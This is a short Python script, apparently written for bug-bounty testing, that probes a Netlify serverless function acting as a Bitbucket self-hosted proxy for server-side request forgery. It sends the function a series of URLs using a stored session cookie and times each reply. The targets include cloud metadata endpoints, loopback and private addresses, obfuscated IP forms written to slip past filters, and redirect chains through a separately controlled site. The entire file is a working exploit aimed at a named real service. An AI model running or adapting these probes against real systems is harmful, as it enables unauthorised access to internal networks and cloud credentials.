# -*- coding: utf-8 -*-
# _bbh_ssrf3.py - timing diff + exotic parse bypass on bitbucket-self-hosted proxy
import sys, os, json, time, urllib.request, urllib.error

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _net_creds import COOKIE_B

FN = "https://app.netlify.com/.netlify/functions/bitbucket-self-hosted"
SB = "https://sec-b-08v4pk.netlify.app"

def timed_probe(tag, url, method="GET"):
    body = {"url": url, "method": method, "token": "x", "payload": None}
    r = urllib.request.Request(FN, method="POST")
    r.add_header("Cookie", COOKIE_B)
    r.add_header("Content-Type", "application/json")
    t0 = time.time()
    try:
        with urllib.request.urlopen(r, data=json.dumps(body).encode(), timeout=35) as resp:
            b = resp.read(4000)
            dt = time.time() - t0
            print("%-40s -> %s %.2fs %s" % (tag, resp.status, dt, b[:120]))
    except urllib.error.HTTPError as e:
        b = e.read(4000)
        dt = time.time() - t0
        print("%-40s -> %s %.2fs %s" % (tag, e.code, dt, b[:120]))
    except Exception as ex:
        dt = time.time() - t0
        print("%-40s -> ERR %.2fs %s" % (tag, dt, str(ex)[:150]))

# timing baselines
timed_probe("pub https example.com", "https://example.com/")
timed_probe("direct meta ip", "http://169.254.169.254/latest/meta-data/")
timed_probe("direct 127.0.0.1", "http://127.0.0.1/x")
timed_probe("direct 10.0.0.1", "http://10.0.0.1/x")
timed_probe("302 chain meta", SB + "/hm_meta/x")
timed_probe("302 chain ctl", SB + "/hm_ctl/x")
# exotic forms
timed_probe("ipv4-mapped v6", "http://[::ffff:127.0.0.1]/x")
timed_probe("octal 0177.0.0.1", "http://0177.0.0.1/x")
timed_probe("0.0.0.0", "http://0.0.0.0/x")
timed_probe("short 2130706433:80", "http://2130706433:80/x")
timed_probe("meta with spaces", "http://169.254.169.254 %2f%2f/x")
timed_probe("meta crlf-ish", "http://169.254.169.254%00/x")
timed_probe("sub.169.254.169.254.xip", "http://169.254.169.254.xip.io/x")
timed_probe("localtest.me", "http://localtest.me/x")
timed_probe("v6unp [::ffff:169.254.169.254]", "http://[::ffff:169.254.169.254]/x")
timed_probe("meta https", "https://169.254.169.254/latest/meta-data/")
timed_probe("100.100.100.200 aliyun", "http://100.100.100.200/latest/meta-data/")
timed_probe("302->hex", SB + "/hm_hex/x")
timed_probe("302->v6u", SB + "/hm_v6u/x")
